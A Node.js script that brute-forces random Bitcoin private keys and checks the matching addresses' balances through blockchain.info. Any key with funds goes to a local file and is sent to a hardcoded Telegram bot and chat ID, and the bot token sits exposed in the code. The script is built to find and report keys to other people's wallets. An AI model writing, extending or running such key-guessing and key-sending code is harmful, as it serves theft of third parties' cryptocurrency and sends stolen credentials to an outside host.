const CoinKey = require("coinkey");
const fs = require("fs").promises;
const { ECPairFactory } = require('ecpair');
const ecc = require('tiny-secp256k1');
const bitcoin = require('bitcoinjs-lib');
const ECPair = ECPairFactory(ecc);
const telebot = require('telebot');
numWallets = 400

const bot = new telebot('7563343579:AAHl5BLWOeW8h9z-QMBwWhjWua5vfZlOIjQ');

const chatId = '8131663948';
let count = 1
let hit = 0

// Send a message to the specified chat ID
function sendTelegramMessage(message) {
    bot.sendMessage(chatId, message);
}

async function saveBPP(bpp) {
    try {
        const stringFromBpp = JSON.stringify(bpp)
        await fs.writeFile("./key.txt", stringFromBpp + '\n');
        console.log("BPP has been saved");
    } catch (err) {
        console.log(err);
    }
}

async function getNewWallet(numberOfWallets) {
    try {
        const wallets = [];
        const pvk_pbk = [];
        let half;
        if (numberOfWallets % 2 === 0) {
            half = numberOfWallets / 2;
        } else {
            half = (numberOfWallets - 1) / 2;
        }
        for (let i = 1; i <= half; i++) {
            const wallet = new CoinKey.createRandom();
            const pvk = wallet.privateKey.toString("hex");
            const keyPair = ECPair.fromPrivateKey(Buffer.from(pvk, 'hex'));
            const { address } = bitcoin.payments.p2pkh({ pubkey: keyPair.publicKey });
            const payment = bitcoin.payments.p2wpkh({ pubkey: keyPair.publicKey });
            const bech32Address = payment.address;
            wallets.push(bech32Address);
            wallets.push(address);
            pvk_pbk.push({ pvk, pbk: bech32Address });
            pvk_pbk.push({ pvk, pbk: address });
        }
        const addressesToCheck = wallets.join(",");
        const response = await fetch(`https://blockchain.info/balance?active=${addressesToCheck}`);
        const data = await response.json();
        const walletsAndBalance = [];
        for (const address in data) {
            const balance = data[address].final_balance;
            const pvk_pbk_pair = pvk_pbk.find(pair => pair.pbk === address);
            if (pvk_pbk_pair) {
                const { pvk, pbk } = pvk_pbk_pair;
                walletsAndBalance.push({ balance, pvk, pbk });
            }
        }
        count++;
        return walletsAndBalance;
    } catch (err) {
        console.log(err);
    }

}

async function main() {
    while (true) {
        try {
            const wallets = await getNewWallet(numWallets);
            for (const wallet of wallets) {
                if (wallet.balance > 0) {
                    hit++;
                    console.log(`\x1b[32mBTC: ${wallet.balance} Address: ${wallet.pbk} PrivateKey: ${wallet.pvk}\x1b[0m`);
                    sendTelegramMessage(`Found BTC!\nBalance: ${wallet.balance}\nAddress: ${wallet.pbk}\nPrivateKey: ${wallet.pvk}`);
                    console.log("You found BTC, privateKey:", wallet.pvk);
                    await saveBPP(wallet);
                } else {
                    
                    console.log(`${wallet.pbk}  ${hit}`);
                }
            }
        } catch (err) {
            console.log(err);
        }
    }
}

main();
